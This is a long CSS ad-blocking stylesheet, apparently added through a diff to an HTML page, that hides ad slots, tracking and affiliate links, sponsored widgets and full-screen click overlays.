+[id^="section-ad-banner"] { display: none !important; }
+div[style^="position: fixed; inset: 0px; z-index: 2147483647; background: black; opacity: 0.01"] { display: none !important; }
+[href*="/afu.php"] { display: none !important; }
+a[href^="https://activate-game.com/"] { display: none !important; }
+a[href^="https://www.friendlyduck.com/AF_"] { display: none !important; }
+[href*="uselnk.com/"] { display: none !important; }
+a[href^="https://track.adform.net/"] { display: none !important; }
+a[href^="https://losingoldfry.com/"] { display: none !important; }
+a[href^="https://www.adultempire.com/"][href*="?partner_id="] { display: none !important; }
+iframe.lazyloaded[data-src^="https://rcm-fe.amazon-adsystem.com/"] { display: none !important; }
+a[href^="http://tc.tradetracker.net/"] > img { display: none !important; }
+div[id^="taboola-stream-"] { display: none !important; }
+a[href^="https://prf.hn/click/"][href*="/camref:"] > img { display: none !important; }
+a[href^="https://track.totalav.com/"] { display: none !important; }
+[id^="div-gpt-ad"] { display: none !important; }
+ad-triple-box { display: none !important; }
+a[href^="https://go.tmrjmp.com"] { display: none !important; }
+a[href^="https://go.etoro.com/"] > img { display: none !important; }
+a[href^="https://streamate.com/landing/click/"] { display: none !important; }
+div[data-ad-wrapper] { display: none !important; }
+[href^="https://freecourseweb.com/"] > .sitefriend { display: none !important; }
+a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] { display: none !important; }
+[href*="//agacelebir.com"] { display: none !important; }
+div[id^="adspot-"] { display: none !important; }
+span[id^="ezoic-pub-ad-placeholder-"] { display: none !important; }
+[href^="//clk.afftracks.online/"] { display: none !important; }
+a[href^="https://t.acam.link/"] { display: none !important; }
+div[style="position: fixed; display: block; width: 100%; height: 100%; inset: 0px; background-color: rgba(0, 0, 0, 0); z-index: 300000;"] { display: none !important; }
+a[href^="https://tc.tradetracker.net/"] > img { display: none !important; }
+[href^="https://glersakr.com/"] { display: none !important; }
+a[href^="https://turnstileunavailablesite.com/"] { display: none !important; }
+a[href^=" https://www.friendlyduck.com/AF_"] { display: none !important; }
+a[href^="http://www.h4trck.com/"] { display: none !important; }
+a[href^="https://go.nordvpn.net/aff"] > img { display: none !important; }
+a[href^="https://ad.doubleclick.net/"] { display: none !important; }
+div[style^="position:fixed;inset:0px;z-index:2147483647;background:black;opacity:0.01"] { display: none !important; }
+[href^="https://cluttercallousstopped.com/"] { display: none !important; }
+a[href^="https://ad.kubiccomps.icu/"] { display: none !important; }
+a[href^="https://www.privateinternetaccess.com/"] > img { display: none !important; }
+[href^="https://www.targetingpartner.com/"] { display: none !important; }
+[onclick*="content.ad/"] { display: none !important; }
+div[data-native-ad] { display: none !important; }
+app-advertisement { display: none !important; }
+[href^="//look.utndln.com/offer"] { display: none !important; }
+[href^="https://ad.admitad.com/"] { display: none !important; }
+a[href^="https://tracker.loropartners.com/"] { display: none !important; }
+div[id^="advads_ad_"] { display: none !important; }
+[href^="https://track.wg-aff.com/click"] { display: none !important; }
+a[href^="https://ads.leovegas.com/redirect.aspx?"] { display: none !important; }
+zeus-ad { display: none !important; }
+a[href^="https://tracking.avapartner.com/"] { display: none !important; }
+[href^="//producebreed.com/"] { display: none !important; }
+[href="https://masstortfinancing.com"] img { display: none !important; }
+a[href^="https://ctosrd.com/"] { display: none !important; }
+[onclick*="postlnk.com"] { display: none !important; }
+div[id^="ad-position-"] { display: none !important; }
+a[href^="//sTaRTgamING.net/tienda/"] { display: none !important; }
+a[href^="https://www.mypornstarcams.com/landing/click/"] { display: none !important; }
+[data-name="adaptiveConstructorAd"] { display: none !important; }
+a[href^="https://go.xlirdr.com"] { display: none !important; }
+amp-ad-custom { display: none !important; }
+a[href^="https://softwa.cfd/"] { display: none !important; }
+a[href^="https://bc.game/"] { display: none !important; }
+[src^="https://forum.picbaron.com/Banner"] { display: none !important; }
+a[href^="https://prf.hn/click/"][href*="/adref:"] > img { display: none !important; }
+[href^="https://www.hostg.xyz/"] > img { display: none !important; }
+a[href^="https://tour.mrskin.com/"] { display: none !important; }
+[data-advadstrackid]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source { display: none !important; }
+a[href^="http://stickingrepute.com/"] { display: none !important; }
+div[id^="optidigital-adslot"] { display: none !important; }
+[href="https://www.masstortfinancing.com/"] > img { display: none !important; }
+a[href^="https://adclick.g.doubleclick.net/"] { display: none !important; }
+amp-fx-flying-carpet { display: none !important; }
+a[href^="https://hotplaystime.life/"] { display: none !important; }
+a[href^="http://cam4com.go2cloud.org/aff_c?"] { display: none !important; }
+[data-adbridg-ad-class] { display: none !important; }
+a[href^="https://lnkxt.bannerator.com/"] { display: none !important; }
+[href="https://clickaine.com"] { display: none !important; }
+[data-role="tile-ads-module"] { display: none !important; }
+div[data-adname] { display: none !important; }
+[href^="https://www.cloudways.com/en/?id"] { display: none !important; }
+[href^="https://noqreport.com/"] > img { display: none !important; }
+a[href^="https://myclick-2.com/"] { display: none !important; }
+a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"] { display: none !important; }
+a[href^="https://chaturbate.com/in/?track="] { display: none !important; }
+[data-rc-widget] { display: none !important; }
+a[href^="https://fastestvpn.com/lifetime-special-deal?a_aid="] { display: none !important; }
+topadblock { display: none !important; }
+a[href^="https://startgaming.net/tienda/" i] { display: none !important; }
+[href^="https://goldcometals.com/clk.trk"] { display: none !important; }
+a[href^="https://kiksajex.com/"] { display: none !important; }
+[href^="https://go.xlrdr.com"] { display: none !important; }
+a[href^="https://go.xlivrdr.com"] { display: none !important; }
+div[data-contentexchange-widget] { display: none !important; }
+a[href^="https://mmwebhandler.aff-online.com/"] { display: none !important; }
+a[href^="https://click.candyoffers.com/"] { display: none !important; }
+[data-ez-name] { display: none !important; }
+a[href^="https://safesurfingtoday.com/"][href*="?skip="] { display: none !important; }
+a[href^="http://www.friendlyduck.com/AF_"] { display: none !important; }
+a[href^="https://a.medfoodsafety.com/"] { display: none !important; }
+a[href^="https://syndication.optimizesrv.com/"] { display: none !important; }
+[href^="https://join.girlsoutwest.com/"] { display: none !important; }
+[data-ad-width] { display: none !important; }
+[href^="https://track.fiverr.com/visit/"] > img { display: none !important; }
+a[href^="https://go.xlviirdr.com"] { display: none !important; }
+a[href^="https://clicks.pipaffiliates.com/"] { display: none !important; }
+[href*="www.gaming-adult.com/"] { display: none !important; }
+a[href^="https://a.medfoodhome.com/"] { display: none !important; }
+a[href^="http://handgripvegetationhols.com/"] { display: none !important; }
+a[href^="https://www.sugarinstant.com/?partner_id="] { display: none !important; }
+[href^="https://charmingdatings.life/"] { display: none !important; }
+a[href^="https://go.xxxiijmp.com"] { display: none !important; }
+a[href^="https://www.get-express-vpn.com/offer/"] { display: none !important; }
+[href^="https://www.mypillow.com/"] > img { display: none !important; }
+a[id][href="https://hamrocsit.com"][rel^="noopener noreferrer"] { display: none !important; }
+a[href^="https://click.dtiserv2.com/"] { display: none !important; }
+[href^="https://mystore.com/"] > img { display: none !important; }
+a[href^="https://go.hpyrdr.com/"] { display: none !important; }
+a[href^="http://avthelkp.net/"] { display: none !important; }
+ins.adsbygoogle { display: none !important; }
+[href^="https://klsdee.com/"] { display: none !important; }
+a[href^="https://go.xxxijmp.com"] { display: none !important; }
+a[href^="https://www.endorico.com/Smartlink/"] { display: none !important; }
+[id^="ad-wrap-"] { display: none !important; }
+a[href^="http://https://www.get-express-vpn.com/offer/"] { display: none !important; }
+div[data-id-advertdfpconf] { display: none !important; }
+a[href^="https://juicyads.in/"] { display: none !important; }
+a[style="width:100%;height:100%;z-index:10000000000000000;position:absolute;top:0;left:0;"] { display: none !important; }
+guj-ad { display: none !important; }
+[href^="https://www.reimageplus.com/"] { display: none !important; }
+[href^="https://antiagingbed.com/discount/"] > img { display: none !important; }
+[href^="luvaihoo.com"] { display: none !important; }
+[href^="https://clicks.affstrack.com/"] > img { display: none !important; }
+a[href^="https://t.hrtye.com/"] { display: none !important; }
+div[data-dfp-id] { display: none !important; }
+div[data-adunit] { display: none !important; }
+a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="] { display: none !important; }
+div[id*="ScriptRoot"] { display: none !important; }
+a[href^="https://www.toprevenuegate.com/"] { display: none !important; }
+a[href^="http://guestblackmail.com/"] { display: none !important; }
+a[href^="https://www.onlineusershielder.com/"] { display: none !important; }
+a[href^="https://go.cmtaffiliates.com/"] { display: none !important; }
+a[href^="http://partners.etoro.com/"] { display: none !important; }
+a[href^="https://t.ajrkm1.com/"] { display: none !important; }
+[href^="//mellowads.com/"] { display: none !important; }
+a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="] { display: none !important; }
+div[id^="zergnet-widget"] { display: none !important; }
+[href^="http://mypillow.com/"] > img { display: none !important; }
+[href="//sexcams.plus/"] { display: none !important; }
+a[id][href="https://toolkitspro.com"][rel^="noopener noreferrer"] { display: none !important; }
+div[id^="div-gpt-"]:not([style^="width: 1px; height: 1px; position: absolute; left: -10000px; top: -"]) { display: none !important; }
+a[href^="https://ndt5.net/"] { display: none !important; }
+[data-wpas-zoneid] { display: none !important; }
+a[href^="https://itubego.com/video-downloader/?affid="] { display: none !important; }
+a[href^="https://t.aslnk.link/"] { display: none !important; }
+div[id^="gpt_ad_"] { display: none !important; }
+[data-testid="adBanner-wrapper"] { display: none !important; }
+[href^="https://exi8ef83z9.com/"] { display: none !important; }
+a[href^="http://adtrack"] { display: none !important; }
+a[href^="https://datingoffers30.info/"] { display: none !important; }
+a[href^="http://revolvemockerycopper.com/"] { display: none !important; }
+a[href^="https://offhandpump.com/"] { display: none !important; }
+hl-adsense { display: none !important; }
+[data-ad-module] { display: none !important; }
+a[href^="https://engine.phn.doublepimp.com/"] { display: none !important; }
+a[href^="https://track.wg-aff.com"] { display: none !important; }
+a[href^="https://join.sexworld3d.com/track/"] { display: none !important; }
+[id^="div-gpt-ad"]:not([style^="width: 1px; height: 1px; position: absolute; left: -10000px; top: -"]) { display: none !important; }
+a[href^="https://torguard.net/aff.php"] > img { display: none !important; }
+a[href^="https://www.nutaku.net/signup/landing/"] { display: none !important; }
+a[href^="https://fc.lc/ref/"] { display: none !important; }
+[href^="http://clicks.totemcash.com/"] { display: none !important; }
+a[href^="https://www.dql2clk.com/"] { display: none !important; }
+a[href^="//staRtgamIng.Net/tienda/"] { display: none !important; }
+a[href^="https://leg.xyz/?track="] { display: none !important; }
+div#spot-holder.spot-holder[style="display: block;"] { display: none !important; }
+[data-adblockkey] { display: none !important; }
+a[href^="https://t.adating.link/"] { display: none !important; }
+[data-id^="div-gpt-ad"] { display: none !important; }
+[href^="https://mypillow.com/"] > img { display: none !important; }
+div[data-alias="300x250 Ad 1"] { display: none !important; }
+[style="top: 0px; left: 0px; width: 940px; height: 600px; position: absolute; z-index: 2147483647;"] { display: none !important; }
+a[data-redirect^="https://paid.outbrain.com/network/redir?"] { display: none !important; }
+[href^="https://secure.bmtmicro.com/servlets/"] { display: none !important; }
+a[href^="https://www.highcpmrevenuenetwork.com/"] { display: none !important; }
+[href="https://jdrucker.com/gold"] > img { display: none !important; }
+[href^="https://www.avantlink.com/click.php"] img { display: none !important; }
+[data-adshim] { display: none !important; }
+[data-testid="ad_testID"] { display: none !important; }
+a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] { display: none !important; }
+a[href^="https://www.mrskin.com/tour"] { display: none !important; }
+[data-ad-cls] { display: none !important; }
+body > div[style$="z-index: 2147483647; top: 0px; left: 0px; position: fixed; display: block;"] { display: none !important; }
+a[href^="https://trk.nfl-online-streams.club/"] { display: none !important; }
+[href^="https://join3.bannedsextapes.com"] { display: none !important; }
+[data-lnguri*="vipbox"] { display: none !important; }
+a[href^="https://bs.serving-sys.com"] { display: none !important; }
+div[id*="MarketGid"] { display: none !important; }
+[href^="https://wap4dollar.com/ad/nonadult/serve.php"] { display: none !important; }
+[src^="//dombnrs.com/"] { display: none !important; }
+[href^="https://mylead.global/stl/"] > img { display: none !important; }
+a[href^="https://go.trackitalltheway.com/"] { display: none !important; }
+a[href^="https://landing1.brazzersnetwork.com"] { display: none !important; }
+a[href^="https://go.markets.com/visit/?bta="] { display: none !important; }
+a[href^="https://clickadilla.com/"] { display: none !important; }
+a[href^="https://trk.sportsflix4k.club/"] { display: none !important; }
+a[href^="https://bluedelivery.pro/"] { display: none !important; }
+[href^="//cadsecs.com/"] { display: none !important; }
+app-ad { display: none !important; }
+a[href^="https://www.liquidfire.mobi/"] { display: none !important; }
+a[href^="https://clixtrac.com/"] { display: none !important; }
+a[href^="http://bongacams.com/track?"] { display: none !important; }
+a[href^="https://www.mrskin.com/account/"] { display: none !important; }
+a[href^="http://bc.vc/?r="] { display: none !important; }
+ad-slot { display: none !important; }
+a[href^="https://hot-growngames.life/"] { display: none !important; }
+a[href^="http://www.mrskin.com/tour"] { display: none !important; }
+a[href*=".engine.adglare.net/"] { display: none !important; }
+a[href^="https://ak.psaltauw.net/"] { display: none !important; }
+div[id][style^="position: fixed; inset: 0px; z-index: 2147483647; background: black"][style*="opacity: 0.01"] { display: none !important; }
+a[href^="https://www.brazzersnetwork.com/landing/"] { display: none !important; }
+[href^="https://routewebtk.com/"] { display: none !important; }
+[href^="https://www.highperformancecpm.com/"] { display: none !important; }
+a[href^="https://ismlks.com/"] { display: none !important; }
+aside[id^="adrotate_widgets-"] { display: none !important; }
+[href^="https://awbbjmp.com/"] { display: none !important; }
+[href^="http://www.mypillow.com/"] > img { display: none !important; }
+a[href^="http://muzzlematrix.com/"] { display: none !important; }
+[id^="ad_sky"] { display: none !important; }
+a[href^="https://join.virtuallust3d.com/"] { display: none !important; }
+[data-dynamic-ads] { display: none !important; }
+a[href^="https://www.financeads.net/tc.php?"] { display: none !important; }
+a[href^="https://iqbroker.com/"][href*="?aff="] { display: none !important; }
+[href^="https://mypatriotsupply.com/"] > img { display: none !important; }
+div[id^="div-gpt-"] { display: none !important; }
+[href^="https://optimizedelite.com/"] > img { display: none !important; }
+[href*="passtechusa.com"] { display: none !important; }
+a[href^="https://pb-track.com/"] { display: none !important; }
+a[href^="https://www.bet365.com/"][href*="affiliate="] { display: none !important; }
+a[href^="https://syndication.exoclick.com/"] { display: none !important; }
+a[href^="https://maymooth-stopic.com/"] { display: none !important; }
+a[href^="https://click.hoolig.app/"] { display: none !important; }
+[href^="https://go.rdrjmp.com/"] { display: none !important; }
+[href^="https://buycheaprdp.com/"] { display: none !important; }
+a[href^="https://a.bestcontentfood.top/"] { display: none !important; }
+ark-top-ad { display: none !important; }
+a[href^="https://ad.zanox.com/ppc/"] > img { display: none !important; }
+a[href^="http://li.blogtrottr.com/click?"] { display: none !important; }
+[href^="https://popcash.net/"] { display: none !important; }
+[class^="amp-ad-"] { display: none !important; }
+a[href^="https://a2.adform.net/"] { display: none !important; }
+ps-connatix-module { display: none !important; }
+[href^="https://cpa.10kfreesilver.com/"] { display: none !important; }
+[href^="https://fireads.online/"] { display: none !important; }
+a[href^="http://com-1.pro/"] { display: none !important; }
+div[id^="dfp-ad-"] { display: none !important; }
+a[data-url^="http://paid.outbrain.com/network/redir?"] + .author { display: none !important; }
+div[id^="google_dfp_"] { display: none !important; }
+div[id^="div-ads-"] { display: none !important; }
+div[data-mini-ad-unit] { display: none !important; }
+a[href^="https://financeads.net/tc.php?"] { display: none !important; }
+div[id^="rc-widget-"] { display: none !important; }
+[href^="https://go.astutelinks.com/"] { display: none !important; }
+[data-d-ad-id] { display: none !important; }
+[class^="tile-picker__CitrusBannerContainer-sc-"] { display: none !important; }
+a[href^="https://chaturbate.com/in/?tour="] { display: none !important; }
+[href^="http://referrer.website/"] { display: none !important; }
+a[href^="https://www.adxsrve.com/"] { display: none !important; }
+[data-ad-width]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+[href^="https://r.kraken.com/"] { display: none !important; }
+[href^="https://pl.allsports4u.club/"] { display: none !important; }
+[href^="https://bestbuyrdp.com/"] { display: none !important; }
+div[id^="_vdo_ads_player_ai_"] { display: none !important; }
+[href^="https://t.mobtyb.com/"] { display: none !important; }
+[data-css-class="dfp-inarticle"] { display: none !important; }
+a[href^="http://premonitioninventdisagree.com/"] { display: none !important; }
+amp-ad { display: none !important; }
+[href^="https://turtlebids.irauctions.com/"] img { display: none !important; }
+a[href^="https://landing.brazzersnetwork.com/"] { display: none !important; }
+a[href^="https://bodelen.com/"] { display: none !important; }
+a[href^="https://www.infowarsstore.com/"] > img { display: none !important; }
+[href^="https://www.mypatriotsupply.com/"] > img { display: none !important; }
+a[href^="https://golinks.work/"] { display: none !important; }
+[href^="https://zstacklife.com/"] img { display: none !important; }
+a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"] { display: none !important; }
+[data-freestar-ad]:not(:empty) { display: none !important; }
+a[href^="https://awptjmp.com/"] { display: none !important; }
+[class^="div-gpt-ad"]:not([style^="width: 1px; height: 1px; position: absolute; left: -10000px; top: -"]) { display: none !important; }
+div[id^="ads250_250-widget-"] { display: none !important; }
+a[href^="https://t.ajump1.com/"] { display: none !important; }
+[href="https://t.me/Russia_Vs_Ukraine_War3"] { display: none !important; }
+a[href^="https://claring-loccelkin.com/"] { display: none !important; }
+a[href^="http://www.adultdvdempire.com/?partner_id="][href*="&utm_"] { display: none !important; }
+[href*="postlnk.com"] { display: none !important; }
+[style="position:absolute;top:0;left:0;width: 100%;height: 100%;z-index:2147483647"] { display: none !important; }
+[href^="//taghaugh.com/"] { display: none !important; }
+a[href^="http://trk.globwo.online/"] { display: none !important; }
+div[class^="kiwi-ad-wrapper"] { display: none !important; }
+a[href^="https://www.bang.com/?aff="] { display: none !important; }
+div[id^="vuukle-ad-"] { display: none !important; }
+amp-connatix-player { display: none !important; }
+a[href^="http://m.hue2m.com/"] { display: none !important; }
+a[href^="http://affiliate.glbtracker.com/"] { display: none !important; }
+a[href^="https://zirdough.net/"] { display: none !important; }
+[data-template-type="nativead"] { display: none !important; }
+a[href^="https://www.googleadservices.com/pagead/aclk?"] { display: none !important; }
+a[dontfo=""][style$="position: absolute; z-index: 2147483647;"] { display: none !important; }
+[onclick*="window.open('http://deloplen.com/"] { display: none !important; }
+div[id^="ezoic-pub-ad-"] { display: none !important; }
+[data-mobile-ad-id] { display: none !important; }
+[href="//xxxrevpushclcdu.com/app.webp"] { display: none !important; }
+display-ad-component { display: none !important; }
+a[href^="https://www.adskeeper.com"] { display: none !important; }
+a[href^="https://go.dmzjmp.com"] { display: none !important; }
+a[href^="https://www.nudeidols.com/cams/"] { display: none !important; }
+a[href^="http://dragfault.com/"] { display: none !important; }
+a[href^="https://ads.planetwin365affiliate.com/redirect.aspx?"] { display: none !important; }
+a[href^="https://pb-front.com/"] { display: none !important; }
+a[href^="https://click.linksynergy.com/fs-bin/"] > img { display: none !important; }
+div[id^="ads300_250-widget-"] { display: none !important; }
+a[href^="https://go.xtbaffiliates.com/"] { display: none !important; }
+[class^="adDisplay-module"] { display: none !important; }
+div[data-ad-placeholder] { display: none !important; }
+a[href^="https://serve.awmdelivery.com/"] { display: none !important; }
+[href^="https://affect3dnetwork.com/track/"] { display: none !important; }
+div[class^="Display_displayAd"] { display: none !important; }
+div[id^="adngin-"] { display: none !important; }
+a[href^="https://ausoafab.net/"] { display: none !important; }
+a[href^="https://go.mnaspm.com/"] { display: none !important; }
+a[href^="https://camfapr.com/landing/click/"] { display: none !important; }
+span[data-ez-ph-id] { display: none !important; }
+a[href^="https://track.afcpatrk.com/"] { display: none !important; }
+dfp-ad { display: none !important; }
+a[href^="https://lobimax.com/"] { display: none !important; }
+a[href^="https://pb-imc.com/"] { display: none !important; }
+a[href^="https://l.hyenadata.com/"] { display: none !important; }
+a[href^="http://www.iyalc.com/"] { display: none !important; }
+a[href^="https://prf.hn/click/"][href*="/creativeref:"] > img { display: none !important; }
+a[href^="https://linkboss.shop/"] { display: none !important; }
+a[href^="https://italarizege.xyz/"] { display: none !important; }
+div[data-adzone] { display: none !important; }
+[data-uri^="https://s3.amazonaws.com"] { display: none !important; }
+[href^="https://buycheaphost.net/"] { display: none !important; }
+a[href^="http://www.poweredbyliquidfire.mobi/"] { display: none !important; }
+a[href^="https://ak.hauchiwu.com/"] { display: none !important; }
+a[href*="/go.php?a_aid="] { display: none !important; }
+a[href^="https://playnano.online/offerwalls/?ref="] { display: none !important; }
+[data-ad-name] { display: none !important; }
+[href^="https://www.herbanomic.com/"] > img { display: none !important; }
+[name^="google_ads_iframe"] { display: none !important; }
+div[data-insertion] { display: none !important; }
+a[data-oburl^="https://paid.outbrain.com/network/redir?"] { display: none !important; }
+[data-ad-manager-id]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+div[class*="displayAdRight"] { display: none !important; }
+a[href^="https://trk.softonixs.xyz/"] { display: none !important; }
+a[href^="http://deskfrontfreely.com/"] { display: none !important; }
+div[id^="ad_position_"] { display: none !important; }
+a[href^="https://cam4com.go2cloud.org/"] { display: none !important; }
+div[style^="z-index: 999999; background-image: url(\"data:image/gif;base64,"][style$="position: absolute;"] { display: none !important; }
+a[href^="https://paid.outbrain.com/network/redir?"] { display: none !important; }
+[href^="https://dl-protect.net/get-premium-url"] { display: none !important; }
+a[href^="https://a.bestcontentoperation.top/"] { display: none !important; }
+div[id^="ad-div-"] { display: none !important; }
+[data-block-type="ad"] { display: none !important; }
+a[href^="//s.st1net.com/splash.php"] { display: none !important; }
+a[href^="http://naggingirresponsible.com/"] { display: none !important; }
+[href^="https://wct.link/"] { display: none !important; }
+a[href^="https://billing.purevpn.com/aff.php"] > img { display: none !important; }
+a[href^="https://ads.betfair.com/redirect.aspx?"] { display: none !important; }
+a[href^="https://natour.naughtyamerica.com/track/"] { display: none !important; }
+a[href^="https://join.dreamsexworld.com/"] { display: none !important; }
+a[href^="https://www.highperformancecpmgate.com/"] { display: none !important; }
+a[href^="https://twinrdsrv.com/"] { display: none !important; }
+[data-advadstrackid] { display: none !important; }
+a[href^="https://go.goaserv.com/"] { display: none !important; }
+a[href^="https://black77854.com/"] { display: none !important; }
+[data-desktop-ad-id] { display: none !important; }
+a[onclick="openAuc();"] { display: none !important; }
+a[href*=".click/?z="][href*="&n"] { display: none !important; }
+a[href*=".foxqck.com/"] { display: none !important; }
+a[href^="https://ak.oalsauwy.net/"] { display: none !important; }
+[href^="https://www.restoro.com/"] { display: none !important; }
+a[href^="http://troopsassistedstupidity.com/"] { display: none !important; }
+display-ads { display: none !important; }
+a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source { display: none !important; }
+a[href^="https://go.skinstrip.net"][href*="?campaignId="] { display: none !important; }
+a[href^="http://dragnag.com/"] { display: none !important; }
+div[id^="lazyad-"] { display: none !important; }
+[data-ad-module]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+a[href^="https://get-link.xyz/"] { display: none !important; }
+a[href^="https://slkmis.com/"] { display: none !important; }
+[class^="div-gpt-ad"] { display: none !important; }
+a[href^="http://eighteenderived.com/"] { display: none !important; }
+a[href^="https://xbet-4.com/"] { display: none !important; }
+a[href^="https://www.geekbuying.com/dynamic-ads/"] { display: none !important; }
+a[href^="https://bongacams10.com/track?"] { display: none !important; }
+a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="] { display: none !important; }
+a[href^="https://go.xxxjmp.com"] { display: none !important; }
+[href^="//ad.jetx.info/"] { display: none !important; }
+a[href^="//STaRTgamING.net/tienda/"] { display: none !important; }
+div[data-ad-targeting] { display: none !important; }
+div[id^="ads300_100-widget-"] { display: none !important; }
+a[href^="https://go.xlvirdr.com"] { display: none !important; }
+[data-revive-zoneid] { display: none !important; }
+a[href^="https://syndication.dynsrvtbg.com/"] { display: none !important; }
+a[href*=".cfm?fp="][href*="&maxads="] { display: none !important; }
+a[id][href="https://chpadblock.com/"][rel^="noopener noreferrer"] { display: none !important; }
+[id^="ad_slider"] { display: none !important; }
+atf-ad-slot { display: none !important; }
+gpt-ad { display: none !important; }
+a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"] { display: none !important; }
+[href^="https://shiftnetwork.infusionsoft.com/go/"] > img { display: none !important; }
+[href^="https://www.brighteonstore.com/products/"] img { display: none !important; }
+[data-adblockkey]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(html):not(.adsbygoogle) { display: none !important; }
+a[href^="https://intenseaffiliates.com/redirect/"] { display: none !important; }
+a[href^="https://bngpt.com/"] { display: none !important; }
+[href^="https://affiliate.fastcomet.com/"] > img { display: none !important; }
+amp-ad { display: none !important; }
+a[href^="https://pubads.g.doubleclick.net/"] { display: none !important; }
+div[id^="adrotate_widgets-"] { display: none !important; }
+a[href^="https://track.ultravpn.com/"] { display: none !important; }
+[class^="DisplayAd"] { display: none !important; }
+a[href^="https://aweptjmp.com/"] { display: none !important; }
+a[href^="https://adultfriendfinder.com/go/"] { display: none !important; }
+a[href^="https://join.virtualtaboo.com/track/"] { display: none !important; }
+[href="https://video-finder.net/"] { display: none !important; }
+[data-m-ad-id] { display: none !important; }
+a[href^="https://www.kingsoffetish.com/tour?partner_id="] { display: none !important; }
+div[data-adunit-path] { display: none !important; }
+citrus-ad-wrapper { display: none !important; }
+[href^="https://rapidgator.net/article/premium/ref/"] { display: none !important; }
+bottomadblock { display: none !important; }
+a[href^="https://a.bestcontentweb.top/"] { display: none !important; }
+[data-ad-manager-id] { display: none !important; }
+div[data-alias="300x250 Ad 2"] { display: none !important; }
+a[href^="https://a-ads.com/"] { display: none !important; }
+a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"] { display: none !important; }
+div[id^="sticky_ad_"] { display: none !important; }
+a[href*="//jjgirls.com/sex/Chaturbate"] { display: none !important; }
+[href^="https://track.aftrk1.com/"] { display: none !important; }
+[href^="https://v.investologic.co.uk/"] { display: none !important; }
+[href^="https://pl.allsports4free.club/"] { display: none !important; }
+app-large-ad { display: none !important; }
+[href^="https://www.onclickmega.com/"] { display: none !important; }
+a[href^="https://go.hpyjmp.com"] { display: none !important; }
+a[href^="https://ab.advertiserurl.com/aff/"] { display: none !important; }
+a[href^="https://affiliate.rusvpn.com/click.php?"] { display: none !important; }
+div[id^="pa_sticky_ad_box_middle_"] { display: none !important; }
+[href^="https://www.onclickperformance.com/"] { display: none !important; }
+article.ad { display: none !important; }
+div[data-content="Advertisement"] { display: none !important; }
+a[href^="https://chaturbate.jjgirls.com/?track="] { display: none !important; }
+div[data-google-query-id] { display: none !important; }
+div[id^="yandex_ad"] { display: none !important; }
+img[src^="https://images.purevpnaffiliates.com"] { display: none !important; }
+[href^="https://trk.clmbtrck.in/click"] { display: none !important; }
+div[style="position: fixed;top: 0;left: 0;right: 0;bottom:0;z-index: 99999999;background: rgba(0,0,0,.6);"] { display: none !important; }
+a[href^="https://a.adtng.com/"] { display: none !important; }
+a[href^="https://tm-offers.gamingadult.com/"] { display: none !important; }
+[href^="https://adult.xyz/"] { display: none !important; }
+ad-slot { display: none !important; }
+amp-embed[type="taboola"] { display: none !important; }
+[href="https://ourgoldguy.com/contact/"] img { display: none !important; }
+a[href^="//sTaRtgaming.net/tienda/"] { display: none !important; }
+[href^="https://join.playboyplus.com/track/"] { display: none !important; }
+a[href^="https://syndication.exdynsrv.com/splash.php"] { display: none !important; }
+[href^="https://go.4rabettraff.com/"] { display: none !important; }
+a[href^="https://combodef.com/"] { display: none !important; }
+a[href^="https://cams.imagetwist.com/in/?track="] { display: none !important; }
+a[href^="https://dl-protect.net/"] { display: none !important; }
+a[href^="https://jaxofuna.com/"] { display: none !important; }
+div[data-native_ad] { display: none !important; }
+a[href^="http://adultfriendfinder.com/go/"] { display: none !important; }
+[href^="https://www.safestcontentgate.com/"] { display: none !important; }
+[href^="https://istlnkcl.com/"] { display: none !important; }
+a[href^="https://ads.ad4game.com/"] { display: none !important; }
+a-ad { display: none !important; }</style></body></html>
